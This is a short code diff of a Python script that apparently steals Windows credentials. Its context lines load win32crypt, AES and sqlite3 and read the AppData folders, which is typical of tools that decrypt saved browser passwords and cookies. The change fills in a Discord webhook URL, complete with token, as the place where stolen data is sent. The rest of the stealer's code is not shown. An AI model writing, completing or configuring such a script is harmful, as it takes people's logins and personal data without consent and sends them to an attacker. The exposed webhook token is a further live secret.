@@ -31,7 +31,7 @@ def install_import(modules):
 
 install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher.AES", "pycryptodome"), ("sqlite3", "sqlite3")])
 
-WEBHOOK_URL = ''  
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1406206609369071656/ZIMRElF0hwsdrbDIK0GrjcYhUJ5xUY1X_lktttuoPrdZPcGmbNVBefY8gfAIsjWGX9y2'  
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -369,3 +369,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
